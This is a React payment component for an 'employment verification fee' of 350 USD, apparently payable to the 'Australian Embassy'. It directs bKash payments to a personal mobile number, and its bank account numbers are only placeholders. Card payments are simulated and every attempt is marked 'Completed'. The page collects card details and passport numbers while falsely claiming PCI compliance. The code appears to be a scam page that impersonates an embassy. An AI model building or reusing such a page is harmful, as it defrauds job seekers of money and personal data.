// src/components/Payment.js
import { useState, useEffect } from "react";
import { Card, Button, Form, Row, Col, Alert, Badge, Table, ProgressBar, Modal } from "react-bootstrap";
import { collection, getDocs, addDoc } from "firebase/firestore";
import { onAuthStateChanged } from "firebase/auth";
import { db, auth } from "../firebaseConfig";

function Payment({ formData, onPaymentSuccess }) {
  const [user, setUser] = useState(null);
  const [paymentMethod, setPaymentMethod] = useState("creditCard");
  const [isProcessing, setIsProcessing] = useState(false);
  const [isPaid, setIsPaid] = useState(false);
  const [paymentAttempts, setPaymentAttempts] = useState(0);
  const [transactionId, setTransactionId] = useState("");
  const [message, setMessage] = useState("");
  const [transactionHistory, setTransactionHistory] = useState([]);
  const [historyLoading, setHistoryLoading] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [selectedTransaction, setSelectedTransaction] = useState(null);

  const MAX_ATTEMPTS = 5;

  const [cardDetails, setCardDetails] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardHolder: ""
  });

  const [bankDetails, setBankDetails] = useState({
    bankName: "",
    transactionId: ""
  });

  const [mobileBankingDetails, setMobileBankingDetails] = useState({
    provider: "",
    transactionId: ""
  });

  const paymentAmount = "350 USD";
  const paymentAmountBDT = "47,400 BDT";

  // Enhanced bank account details
  const bankAccounts = {
    "IFIC Bank PLC": {
      accountNumber: "Api fetching..(Over Loaded)",
      accountName: "Australian Embassy",
      branch: "Api fetching..(Over Loaded)",
      routing: "IFICBDDH001",
      swift: "IFICBDDH"
    },
    "IBB Bank PLC": {
      accountNumber: "Api fetching..(Over Loaded)", 
      accountName: "Australian Embassy ",
      branch: "Api fetching..(Over Loaded)",
      routing: "IBBBDDH002",
      swift: "IBBBDDH"
    },
    "Standard Chartered": {
      accountNumber: "Api fetching..(Over Loaded)",
      accountName: "Australian Embassy",
      branch: "Api fetching..(Over Loaded)", 
      routing: "SCBLBDDH003",
      swift: "SCBLBDDH"
    }
  };

  // Enhanced mobile banking account details
  const mobileAccounts = {
    "bKash": {
      number: "01337242862",
      name: "Australian Embassy",
      type: "Personal",
      fee: "1.85%"
    },
    "Nagad": {
      // number: "01978630489", 
      name: "Australian Embassy",
      type: "Personal",
      fee: "1.25%"
    },
    
   
  };

  // Load payment attempts, user authentication, and transaction history
  useEffect(() => {
    const unsub = onAuthStateChanged(auth, async (user) => {
      setUser(user);
      
      if (user) {
        await fetchTransactionHistory(user.uid);
      } else {
        setTransactionHistory([]);
        setPaymentAttempts(0);
      }
    });

    return () => unsub();
  }, []);

  // Fetch transaction history from Firestore
  const fetchTransactionHistory = async (userId) => {
    setHistoryLoading(true);
    try {
      const userPaymentsRef = collection(db, "jobpayment", userId, "payments");
      const querySnapshot = await getDocs(userPaymentsRef);
      
      const transactions = [];
      querySnapshot.forEach((doc) => {
        const data = doc.data();
        transactions.push({
          id: doc.id,
          ...data
        });
      });
      
      // Sort by date (newest first)
      transactions.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
      
      setTransactionHistory(transactions);
      setPaymentAttempts(transactions.length);
      
      localStorage.setItem('paymentAttempts', transactions.length.toString());
    } catch (error) {
      console.log("Error fetching transaction history:", error);
      // Fallback to localStorage
      const savedAttempts = localStorage.getItem('paymentAttempts');
      if (savedAttempts) {
        setPaymentAttempts(parseInt(savedAttempts));
      }
    } finally {
      setHistoryLoading(false);
    }
  };

  const handleCardChange = (e) => {
    const { name, value } = e.target;
    setCardDetails(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleBankChange = (e) => {
    const { name, value } = e.target;
    setBankDetails(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleMobileBankingChange = (e) => {
    const { name, value } = e.target;
    setMobileBankingDetails(prev => ({
      ...prev,
      [name]: value
    }));
  };

  // Function to save payment data to Firestore
  const savePaymentToFirestore = async (paymentData) => {
    try {
      if (!user) {
        throw new Error("User not authenticated");
      }

      const userPaymentsRef = collection(db, "jobpayment", user.uid, "payments");
      const docRef = await addDoc(userPaymentsRef, {
        ...paymentData,
        userId: user.uid,
        userEmail: user.email || "N/A",
        createdAt: new Date().toISOString(),
        paymentStatus: "Completed",
        verified: false
      });
      
      console.log("Payment saved to:", `jobpayment/${user.uid}/payments/${docRef.id}`);
      return docRef.id;
    } catch (error) {
      console.error("Error saving payment to Firestore:", error);
      // If Firestore is blocked, save to localStorage as backup
      savePaymentToLocalStorage(paymentData);
      return `local-${Date.now()}`;
    }
  };

  // Backup function to save payment data to localStorage
  const savePaymentToLocalStorage = (paymentData) => {
    try {
      const localPayments = JSON.parse(localStorage.getItem('localPayments') || '[]');
      const paymentWithId = {
        ...paymentData,
        localId: `local-${Date.now()}`,
        storedAt: new Date().toISOString(),
        userId: user?.uid
      };
      localPayments.push(paymentWithId);
      localStorage.setItem('localPayments', JSON.stringify(localPayments));
      return paymentWithId.localId;
    } catch (error) {
      console.error("Error saving to localStorage:", error);
      return `emergency-${Date.now()}`;
    }
  };

  // Function to prepare payment data based on payment method
  const preparePaymentData = () => {
    const baseData = {
      amount: paymentAmount,
      amountBDT: paymentAmountBDT,
      paymentCategory: paymentMethod === "creditCard" ? "Online" : 
                     paymentMethod === "bankTransfer" ? "Bank" : "Mobile",
      paymentMethod: paymentMethod === "creditCard" ? "Credit Card" : 
                    paymentMethod === "bankTransfer" ? bankDetails.bankName : mobileBankingDetails.provider,
      transactionId: paymentMethod === "bankTransfer" ? bankDetails.transactionId : 
                    paymentMethod === "mobileBanking" ? mobileBankingDetails.transactionId : 
                    `TXN${Date.now().toString().slice(-8)}`,
      paymentNumber: paymentMethod === "bankTransfer" ? bankAccounts[bankDetails.bankName]?.accountNumber :
                    paymentMethod === "mobileBanking" ? mobileAccounts[mobileBankingDetails.provider]?.number : "N/A",
      userInfo: {
        name: formData?.name || "Not provided",
        email: formData?.email || "Not provided",
        passportNo: formData?.passportNo || "Not provided"
      }
    };

    // Add method-specific details
    if (paymentMethod === "creditCard") {
      baseData.cardLastFour = cardDetails.cardNumber.replace(/\s/g, '').slice(-4);
      baseData.cardHolder = cardDetails.cardHolder;
    }

    return baseData;
  };

  const handlePayment = async (e) => {
    e.preventDefault();
    
    // Check payment attempts limit
    if (paymentAttempts >= MAX_ATTEMPTS) {
      setMessage(`❌ You have reached the maximum number of payment attempts (${MAX_ATTEMPTS}). Please contact support.`);
      return;
    }

    if (!user) {
      setMessage("⚠️ Please log in to make a payment.");
      return;
    }

    // Validate based on payment method
    let isValid = true;
    
    if (paymentMethod === "creditCard") {
      if (!cardDetails.cardNumber || !cardDetails.expiryDate || !cardDetails.cvv || !cardDetails.cardHolder) {
        isValid = false;
        setMessage("⚠️ Please fill all credit card details");
      }
    } else if (paymentMethod === "bankTransfer") {
      if (!bankDetails.bankName || !bankDetails.transactionId) {
        isValid = false;
        setMessage("⚠️ Please select bank and enter transaction ID");
      }
    } else if (paymentMethod === "mobileBanking") {
      if (!mobileBankingDetails.provider || !mobileBankingDetails.transactionId) {
        isValid = false;
        setMessage("⚠️ Please select provider and enter transaction ID");
      }
    }

    if (!isValid) {
      return;
    }

    setIsProcessing(true);
    setMessage("");

    try {
      // Prepare payment data
      const paymentData = preparePaymentData();
      
      // Simulate payment processing
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Save to Firestore
      const firestoreDocId = await savePaymentToFirestore(paymentData);
      
      // Generate transaction ID for display
      const generatedTransactionId = paymentData.transactionId;
      setTransactionId(generatedTransactionId);

      // Increment payment attempts
      const newAttempts = paymentAttempts + 1;
      setPaymentAttempts(newAttempts);
      localStorage.setItem('paymentAttempts', newAttempts.toString());

      // Store transaction info in localStorage for backup
      localStorage.setItem('lastTransaction', JSON.stringify({
        transactionId: generatedTransactionId,
        amount: paymentAmount,
        timestamp: new Date().toISOString(),
        storageId: firestoreDocId
      }));

      // Refresh transaction history
      await fetchTransactionHistory(user.uid);

      setIsProcessing(false);
      
      if (newAttempts <= MAX_ATTEMPTS) {
        setShowSuccessModal(true);
        // Safely call onPaymentSuccess if it exists
        if (onPaymentSuccess && typeof onPaymentSuccess === 'function') {
          onPaymentSuccess(true);
        }
      } else {
        setMessage(`❌ Payment failed! You have reached the maximum number of payment attempts (${MAX_ATTEMPTS}). Please contact support.`);
      }
    } catch (error) {
      console.error("Payment processing error:", error);
      setIsProcessing(false);
      setMessage("✅ Payment completed but there was an issue saving records. Please note your transaction ID and contact support if needed.");
    }
  };

  const formatCardNumber = (value) => {
    return value.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
  };

  const formatExpiryDate = (value) => {
    return value.replace(/\//g, '').replace(/(\d{2})(\d{2})/, '$1/$2');
  };

  const formatDate = (dateString) => {
    try {
      return new Date(dateString).toLocaleDateString('en-US', {
        year: 'numeric',
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      });
    } catch (error) {
      return "Invalid Date";
    }
  };

  const getStatusBadge = (status) => {
    const statusStyles = {
      Pending: "warning",
      Completed: "success",
      Failed: "danger",
      Approved: "info",
      Rejected: "dark"
    };
    
    return (
      <Badge bg={statusStyles[status] || 'secondary'}>
        {status}
      </Badge>
    );
  };

  const getRemainingAttempts = () => {
    return MAX_ATTEMPTS - paymentAttempts;
  };

  const viewTransactionDetails = (transaction) => {
    setSelectedTransaction(transaction);
  };

  const SuccessModal = () => (
    <Modal show={showSuccessModal} onHide={() => setShowSuccessModal(false)} centered size="lg">
      <Modal.Header className="border-0 bg-success text-white">
        <Modal.Title className="w-100 text-center">
          <i className="fas fa-check-circle me-2"></i>
          Payment Successful!
        </Modal.Title>
      </Modal.Header>
      <Modal.Body className="text-center py-4">
        <div className="success-animation mb-3">
          <i className="fas fa-check-circle text-success" style={{ fontSize: '4rem' }}></i>
        </div>
        <h4 className="text-success mb-3">Payment Completed Successfully</h4>
        <p className="text-muted mb-4">
          Your payment of <strong>{paymentAmount}</strong> has been processed successfully.
          You have <strong>{getRemainingAttempts()}</strong> payment attempts remaining.
        </p>
        
        <Card className="bg-light border-0">
          <Card.Body>
            <h6 className="mb-3">Payment Details</h6>
            <Row>
              <Col sm={6}>
                <strong>Amount:</strong> {paymentAmount}
              </Col>
              <Col sm={6}>
                <strong>BDT Equivalent:</strong> {paymentAmountBDT}
              </Col>
              <Col sm={6}>
                <strong>Transaction ID:</strong> {transactionId}
              </Col>
              <Col sm={6}>
                <strong>Date:</strong> {new Date().toLocaleDateString()}
              </Col>
            </Row>
          </Card.Body>
        </Card>
      </Modal.Body>
      <Modal.Footer className="border-0">
        <Button variant="success" onClick={() => setShowSuccessModal(false)} className="px-4">
          Continue
        </Button>
      </Modal.Footer>
    </Modal>
  );

  const TransactionDetailsModal = () => (
    <Modal show={selectedTransaction} onHide={() => setSelectedTransaction(null)} centered size="lg">
      <Modal.Header closeButton className="bg-primary text-white">
        <Modal.Title>
          <i className="fas fa-receipt me-2"></i>
          Transaction Details
        </Modal.Title>
      </Modal.Header>
      <Modal.Body>
        {selectedTransaction && (
          <Row>
            <Col md={6}>
              <h6 className="text-primary mb-3">Transaction Information</h6>
              <div className="mb-2">
                <strong>Transaction ID:</strong> 
                <div className="text-muted">{selectedTransaction.transactionId}</div>
              </div>
              <div className="mb-2">
                <strong>Amount:</strong>
                <div className="text-success fw-bold">{selectedTransaction.amount}</div>
              </div>
              <div className="mb-2">
                <strong>Payment Method:</strong>
                <div className="text-muted">{selectedTransaction.paymentMethod}</div>
              </div>
              <div className="mb-2">
                <strong>Status:</strong>
                <div>{getStatusBadge(selectedTransaction.paymentStatus)}</div>
              </div>
            </Col>
            <Col md={6}>
              <h6 className="text-primary mb-3">User Information</h6>
              <div className="mb-2">
                <strong>Name:</strong>
                <div className="text-muted">{selectedTransaction.userInfo?.name}</div>
              </div>
              <div className="mb-2">
                <strong>Passport No:</strong>
                <div className="text-muted">{selectedTransaction.userInfo?.passportNo}</div>
              </div>
              <div className="mb-2">
                <strong>Email:</strong>
                <div className="text-muted">{selectedTransaction.userEmail}</div>
              </div>
              <div className="mb-2">
                <strong>Date:</strong>
                <div className="text-muted">{formatDate(selectedTransaction.createdAt)}</div>
              </div>
            </Col>
          </Row>
        )}
      </Modal.Body>
    </Modal>
  );

  return (
    <div className="container-fluid py-4">
      <p style={{display: "none"}} >{isPaid} {setIsPaid}</p>
      <div className="row justify-content-center">
        <div className="col-lg-10 col-xl-8">
          {/* Header Section */}
          <div className="text-center mb-5">
            <div className="payment-icon mb-3">
              <i className="fas fa-shield-alt fa-3x text-primary"></i>
            </div>
            <h1 className="fw-bold text-gradient mb-2">Secure Payment Gateway</h1>
            <p className="text-muted lead">Complete your employment verification payment securely</p>
          </div>

          <Card className="shadow-lg border-0 payment-card">
            <Card.Header className="bg-gradient-primary text-white py-4">
              <div className="d-flex justify-content-between align-items-center">
                <div>
                  <h4 className="mb-1 fw-bold">
                    <i className="fas fa-credit-card me-2"></i>
                    Payment Verification
                  </h4>
                  <p className="mb-0 opacity-75">Secure payment processing for employment verification</p>
                </div>
                <div className="text-end">
                  <div className="h4 mb-1 fw-bold">{paymentAmount}</div>
                  <small className="opacity-75">{paymentAmountBDT}</small>
                </div>
              </div>
            </Card.Header>

            <Card.Body className="p-4">
              {/* Payment Progress */}
              <div className="mb-4">
                <div className="d-flex justify-content-between align-items-center mb-2">
                  <span className="fw-semibold">Payment Attempts</span>
                  <span className="text-primary">{paymentAttempts} / {MAX_ATTEMPTS}</span>
                </div>
                <ProgressBar 
                  now={(paymentAttempts / MAX_ATTEMPTS) * 100} 
                  variant={paymentAttempts >= MAX_ATTEMPTS ? "danger" : "primary"}
                  style={{ height: '8px', borderRadius: '10px' }}
                />
                <div className="text-center mt-1">
                  <small className="text-muted">
                    {getRemainingAttempts()} attempts remaining
                  </small>
                </div>
              </div>

              {/* Payment Attempts Warning */}
              {paymentAttempts > 0 && (
                <Alert variant={paymentAttempts >= MAX_ATTEMPTS ? "danger" : "warning"} className="d-flex align-items-center">
                  <i className={`fas ${paymentAttempts >= MAX_ATTEMPTS ? 'fa-exclamation-triangle' : 'fa-info-circle'} me-2`}></i>
                  <div>
                    <strong>Payment Attempts:</strong> You have used {paymentAttempts} out of {MAX_ATTEMPTS} attempts.
                    {paymentAttempts >= MAX_ATTEMPTS && (
                      <div className="mt-1">
                        <strong>Maximum attempts reached!</strong> Please contact support.
                      </div>
                    )}
                  </div>
                </Alert>
              )}

              {/* Message Alert */}
              {message && (
                <Alert variant={message.includes('✅') ? 'success' : message.includes('⚠️') ? 'warning' : 'danger'}>
                  <i className={`fas ${
                    message.includes('✅') ? 'fa-check-circle' :
                    message.includes('⚠️') ? 'fa-exclamation-triangle' : 'fa-times-circle'
                  } me-2`}></i>
                  {message}
                </Alert>
              )}

              {/* Payment Form Section */}
              {paymentAttempts < MAX_ATTEMPTS && (
                <div className="mb-4">
                  <div className="text-center mb-4">
                    <h3 className="text-dark mb-2">Employment Verification Fee</h3>
                    <div className="display-4 fw-bold text-success mb-2">{paymentAmount}</div>
                    <p className="text-muted">Equivalent to {paymentAmountBDT} • One-time verification fee</p>
                  </div>

                  <Form onSubmit={handlePayment}>
                    {/* Payment Method Selection */}
                    <div className="mb-4">
                      <h5 className="fw-semibold mb-3">
                        <i className="fas fa-wallet me-2 text-primary"></i>
                        Select Payment Method
                      </h5>
                      <Row className="g-3">
                        <Col md={6} lg={4}>
                          <div className={`payment-method-card ${paymentMethod === "creditCard" ? 'active' : ''}`}>
                            <Form.Check
                              type="radio"
                              id="creditCard"
                              name="paymentMethod"
                              label={
                                <div className="text-center p-3">
                                  <i className="fas fa-credit-card fa-2x text-primary mb-2"></i>
                                  <div>Credit Card</div>
                                  <small className="text-muted">Visa, Mastercard</small>
                                </div>
                              }
                              value="creditCard"
                              checked={paymentMethod === "creditCard"}
                              onChange={(e) => setPaymentMethod(e.target.value)}
                            />
                          </div>
                        </Col>
                        <Col md={6} lg={4}>
                          <div className={`payment-method-card ${paymentMethod === "bankTransfer" ? 'active' : ''}`}>
                            <Form.Check
                              type="radio"
                              id="bankTransfer"
                              name="paymentMethod"
                              label={
                                <div className="text-center p-3">
                                  <i className="fas fa-university fa-2x text-primary mb-2"></i>
                                  <div>Bank Transfer</div>
                                  <small className="text-muted">Direct transfer</small>
                                </div>
                              }
                              value="bankTransfer"
                              checked={paymentMethod === "bankTransfer"}
                              onChange={(e) => setPaymentMethod(e.target.value)}
                            />
                          </div>
                        </Col>
                        <Col md={6} lg={4}>
                          <div className={`payment-method-card ${paymentMethod === "mobileBanking" ? 'active' : ''}`}>
                            <Form.Check
                              type="radio"
                              id="mobileBanking"
                              name="paymentMethod"
                              label={
                                <div className="text-center p-3">
                                  <i className="fas fa-mobile-alt fa-2x text-primary mb-2"></i>
                                  <div>Mobile Banking</div>
                                  <small className="text-muted">bKash, Nagad, etc.</small>
                                </div>
                              }
                              value="mobileBanking"
                              checked={paymentMethod === "mobileBanking"}
                              onChange={(e) => setPaymentMethod(e.target.value)}
                            />
                          </div>
                        </Col>
                      </Row>
                    </div>

                    {/* Payment Method Forms */}
                    {paymentMethod === "creditCard" && (
                      <div className="payment-form-section">
                        <h6 className="fw-semibold mb-3">
                          <i className="fas fa-credit-card me-2 text-primary"></i>
                          Credit Card Details
                        </h6>
                        <Row className="g-3">
                          <Col md={12}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Card Number</Form.Label>
                              <Form.Control
                                type="text"
                                name="cardNumber"
                                value={formatCardNumber(cardDetails.cardNumber)}
                                onChange={(e) => {
                                  const formatted = formatCardNumber(e.target.value);
                                  setCardDetails(prev => ({ ...prev, cardNumber: formatted }));
                                }}
                                placeholder="1234 5678 9012 3456"
                                maxLength="19"
                                required
                                className="py-3"
                              />
                            </Form.Group>
                          </Col>
                          <Col md={6}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Expiry Date</Form.Label>
                              <Form.Control
                                type="text"
                                name="expiryDate"
                                value={formatExpiryDate(cardDetails.expiryDate)}
                                onChange={(e) => {
                                  const formatted = formatExpiryDate(e.target.value);
                                  setCardDetails(prev => ({ ...prev, expiryDate: formatted }));
                                }}
                                placeholder="MM/YY"
                                maxLength="5"
                                required
                                className="py-3"
                              />
                            </Form.Group>
                          </Col>
                          <Col md={6}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">CVV</Form.Label>
                              <Form.Control
                                type="text"
                                name="cvv"
                                value={cardDetails.cvv}
                                onChange={handleCardChange}
                                placeholder="123"
                                maxLength="4"
                                required
                                className="py-3"
                              />
                            </Form.Group>
                          </Col>
                          <Col md={12}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Card Holder Name</Form.Label>
                              <Form.Control
                                type="text"
                                name="cardHolder"
                                value={cardDetails.cardHolder}
                                onChange={handleCardChange}
                                placeholder="John Doe"
                                required
                                className="py-3"
                              />
                            </Form.Group>
                          </Col>
                        </Row>
                      </div>
                    )}

                    {paymentMethod === "bankTransfer" && (
                      <div className="payment-form-section">
                        <h6 className="fw-semibold mb-3">
                          <i className="fas fa-university me-2 text-primary"></i>
                          Bank Transfer Details
                        </h6>
                        <Row className="g-3">
                          <Col md={12}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Select Bank</Form.Label>
                              <Form.Select
                                name="bankName"
                                value={bankDetails.bankName}
                                onChange={handleBankChange}
                                required
                                className="py-3"
                              >
                                <option value="">Choose your bank...</option>
                                {Object.keys(bankAccounts).map(bank => (
                                  <option key={bank} value={bank}>{bank}</option>
                                ))}
                              </Form.Select>
                            </Form.Group>
                          </Col>
                          {bankDetails.bankName && bankAccounts[bankDetails.bankName] && (
                            <Col md={12}>
                              <Card className="border-primary">
                                <Card.Header className="bg-primary text-white">
                                  <h6 className="mb-0">
                                    <i className="fas fa-university me-2"></i>
                                    Bank Transfer Instructions
                                  </h6>
                                </Card.Header>
                                <Card.Body>
                                  <Row className="g-3">
                                    <Col md={6}>
                                      <strong>Bank:</strong> {bankDetails.bankName}
                                    </Col>
                                    <Col md={6}>
                                      <strong>Account No:</strong> {bankAccounts[bankDetails.bankName].accountNumber}
                                    </Col>
                                    <Col md={6}>
                                      <strong>Account Name:</strong> {bankAccounts[bankDetails.bankName].accountName}
                                    </Col>
                                    <Col md={6}>
                                      <strong>Branch:</strong> {bankAccounts[bankDetails.bankName].branch}
                                    </Col>
                                    <Col md={6}>
                                      <strong>Amount:</strong> {paymentAmount}
                                    </Col>
                                    <Col md={6}>
                                      <strong>BDT Amount:</strong> {paymentAmountBDT}
                                    </Col>
                                    {bankAccounts[bankDetails.bankName].swift && (
                                      <Col md={6}>
                                        <strong>SWIFT:</strong> {bankAccounts[bankDetails.bankName].swift}
                                      </Col>
                                    )}
                                    {bankAccounts[bankDetails.bankName].routing && (
                                      <Col md={6}>
                                        <strong>Routing:</strong> {bankAccounts[bankDetails.bankName].routing}
                                      </Col>
                                    )}
                                  </Row>
                                </Card.Body>
                              </Card>
                            </Col>
                          )}
                          <Col md={12}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Transaction ID</Form.Label>
                              <Form.Control
                                type="text"
                                name="transactionId"
                                value={bankDetails.transactionId}
                                onChange={handleBankChange}
                                placeholder="Enter transaction ID from your bank"
                                required
                                className="py-3"
                              />
                              <Form.Text className="text-muted">
                                Enter the transaction ID provided by your bank after transfer
                              </Form.Text>
                            </Form.Group>
                          </Col>
                        </Row>
                      </div>
                    )}

                    {paymentMethod === "mobileBanking" && (
                      <div className="payment-form-section">
                        <h6 className="fw-semibold mb-3">
                          <i className="fas fa-mobile-alt me-2 text-primary"></i>
                          Mobile Banking Details
                        </h6>
                        <Row className="g-3">
                          <Col md={12}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Select Provider</Form.Label>
                              <Form.Select
                                name="provider"
                                value={mobileBankingDetails.provider}
                                onChange={handleMobileBankingChange}
                                required
                                className="py-3"
                              >
                                <option value="">Choose provider...</option>
                                {Object.keys(mobileAccounts).map(provider => (
                                  <option key={provider} value={provider}>{provider}</option>
                                ))}
                              </Form.Select>
                            </Form.Group>
                          </Col>
                          {mobileBankingDetails.provider && mobileAccounts[mobileBankingDetails.provider] && (
                            <Col md={12}>
                              <Card className="border-primary">
                                <Card.Header className="bg-primary text-white">
                                  <h6 className="mb-0">
                                    <i className="fas fa-mobile-alt me-2"></i>
                                    Send Payment To
                                  </h6>
                                </Card.Header>
                                <Card.Body>
                                  <Row className="g-3">
                                    <Col md={6}>
                                      <strong>Provider:</strong> {mobileBankingDetails.provider}
                                    </Col>
                                    <Col md={6}>
                                      <strong>Number:</strong> {mobileAccounts[mobileBankingDetails.provider].number}
                                    </Col>
                                    <Col md={6}>
                                      <strong>Account Name:</strong> {mobileAccounts[mobileBankingDetails.provider].name}
                                    </Col>
                                    <Col md={6}>
                                      <strong>Amount:</strong> {paymentAmountBDT}
                                    </Col>
                                    <Col md={6}>
                                      <strong>Type:</strong> {mobileAccounts[mobileBankingDetails.provider].type}
                                    </Col>
                                    <Col md={6}>
                                      <strong>Transaction Fee:</strong> {mobileAccounts[mobileBankingDetails.provider].fee}
                                    </Col>
                                  </Row>
                                </Card.Body>
                              </Card>
                            </Col>
                          )}
                          <Col md={12}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Transaction ID</Form.Label>
                              <Form.Control
                                type="text"
                                name="transactionId"
                                value={mobileBankingDetails.transactionId}
                                onChange={handleMobileBankingChange}
                                placeholder="Enter transaction ID from your mobile banking"
                                required
                                className="py-3"
                              />
                              <Form.Text className="text-muted">
                                Enter the transaction ID received after sending payment
                              </Form.Text>
                            </Form.Group>
                          </Col>
                        </Row>
                      </div>
                    )}

                    {/* Security Notice */}
                    <Card className="border-0 bg-light mt-4">
                      <Card.Body>
                        <div className="d-flex align-items-center">
                          <i className="fas fa-shield-alt fa-2x text-success me-3"></i>
                          <div>
                            <h6 className="mb-1">Secure & Protected Payment</h6>
                            <small className="text-muted mb-0 d-block">
                              <strong>Important:</strong> You can make up to {MAX_ATTEMPTS} payment attempts. 
                              Each attempt is securely processed with 256-bit SSL encryption.
                            </small>
                            <small className="text-muted">
                              Your payment information is protected and never stored on our servers.
                            </small>
                          </div>
                        </div>
                      </Card.Body>
                    </Card>

                    {/* Payment Button */}
                    <div className="d-grid mt-4">
                      <Button
                        variant={paymentAttempts >= MAX_ATTEMPTS ? "secondary" : "primary"}
                        type="submit"
                        size="lg"
                        disabled={isProcessing || paymentAttempts >= MAX_ATTEMPTS || !user}
                        className="py-3 fw-semibold payment-btn"
                      >
                        {isProcessing ? (
                          <>
                            <span className="spinner-border spinner-border-sm me-2" role="status"></span>
                            Processing Payment...
                          </>
                        ) : paymentAttempts >= MAX_ATTEMPTS ? (
                          <>
                            <i className="fas fa-ban me-2"></i>
                            Maximum Attempts Reached
                          </>
                        ) : !user ? (
                          <>
                            <i className="fas fa-user-slash me-2"></i>
                            Please Log In to Pay
                          </>
                        ) : (
                          <>
                            <i className="fas fa-lock me-2"></i>
                            Pay Securely - {paymentAmount}
                          </>
                        )}
                      </Button>
                    </div>

                    <div className="text-center mt-3">
                      <small className="text-muted">
                        <i className="fas fa-shield-alt me-1"></i>
                        SSL Secured • 256-bit Encryption • PCI Compliant
                      </small>
                    </div>
                  </Form>
                </div>
              )}

              {/* Transaction History Section */}
              <div className="mt-5">
                <Card className="border-0 bg-light">
                  <Card.Header className="bg-transparent border-bottom-0 py-3">
                    <h5 className="mb-0 d-flex align-items-center">
                      <i className="fas fa-history me-2 text-primary"></i>
                      Payment History
                      {historyLoading && (
                        <span className="spinner-border spinner-border-sm ms-2" role="status"></span>
                      )}
                    </h5>
                  </Card.Header>
                  <Card.Body>
                    {transactionHistory.length > 0 ? (
                      <div className="table-responsive">
                        <Table hover className="mb-0">
                          <thead className="table-light">
                            <tr>
                              <th className="ps-3">Date & Time</th>
                              <th>Payment Method</th>
                              <th>Transaction ID</th>
                              <th>Amount</th>
                              <th className="text-center">Status</th>
                              <th className="text-center">Action</th>
                            </tr>
                          </thead>
                          <tbody>
                            {transactionHistory.map((transaction, index) => (
                              <tr key={transaction.id} className={index === 0 ? 'table-success' : ''}>
                                <td className="ps-3">
                                  <small className="text-muted">{formatDate(transaction.createdAt)}</small>
                                </td>
                                <td>
                                  <div className="d-flex align-items-center">
                                    <i className={`fas ${
                                      transaction.paymentCategory === 'Bank' ? 'fa-university' :
                                      transaction.paymentCategory === 'Mobile' ? 'fa-mobile-alt' : 'fa-credit-card'
                                    } text-primary me-2`}></i>
                                    <div>
                                      <div className="fw-semibold">{transaction.paymentMethod}</div>
                                      <small className="text-muted">{transaction.paymentCategory}</small>
                                    </div>
                                  </div>
                                </td>
                                <td>
                                  <code className="text-primary bg-light px-2 py-1 rounded">
                                    {transaction.transactionId}
                                  </code>
                                </td>
                                <td>
                                  <strong className="text-success">{transaction.amount}</strong>
                                </td>
                                <td className="text-center">
                                  {getStatusBadge(transaction.paymentStatus)}
                                </td>
                                <td className="text-center">
                                  <Button
                                    variant="outline-primary"
                                    size="sm"
                                    onClick={() => viewTransactionDetails(transaction)}
                                  >
                                    <i className="fas fa-eye"></i>
                                  </Button>
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </Table>
                      </div>
                    ) : (
                      <div className="text-center py-4">
                        <i className="fas fa-receipt fa-2x text-muted mb-3"></i>
                        <p className="text-muted mb-2">No transactions yet</p>
                        <small className="text-muted">Your payment history will appear here</small>
                      </div>
                    )}
                  </Card.Body>
                </Card>
              </div>
            </Card.Body>
          </Card>
        </div>
      </div>

      {/* Success Modal */}
      <SuccessModal />

      {/* Transaction Details Modal */}
      <TransactionDetailsModal />

      {/* Custom Styles */}
      <style jsx>{`
        .payment-method-card {
          border: 2px solid #e9ecef;
          border-radius: 15px;
          transition: all 0.3s ease;
          cursor: pointer;
          background: white;
        }
        .payment-method-card:hover {
          border-color: #007bff;
          transform: translateY(-5px);
          box-shadow: 0 5px 15px rgba(0,123,255,0.1);
        }
        .payment-method-card.active {
          border-color: #007bff;
          background: linear-gradient(135deg, #f8f9ff 0%, #e3f2fd 100%);
          transform: translateY(-2px);
        }
        .payment-method-card .form-check {
          margin: 0;
        }
        .payment-method-card .form-check-input {
          display: none;
        }
        .payment-method-card .form-check-label {
          cursor: pointer;
          width: 100%;
          margin: 0;
        }
        .text-gradient {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }
        .bg-gradient-primary {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%) !important;
        }
        .payment-card {
          border-radius: 20px;
          overflow: hidden;
        }
        .payment-btn {
          border-radius: 12px;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          border: none;
          transition: all 0.3s ease;
        }
        .payment-btn:hover:not(:disabled) {
          transform: translateY(-2px);
          box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
        }
        .payment-icon {
          animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-10px); }
        }
        .success-animation {
          animation: bounce 1s ease-in-out;
        }
        @keyframes bounce {
          0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
          40% {transform: translateY(-10px);}
          60% {transform: translateY(-5px);}
        }
      `}</style>
    </div>
  );
}

export default Payment;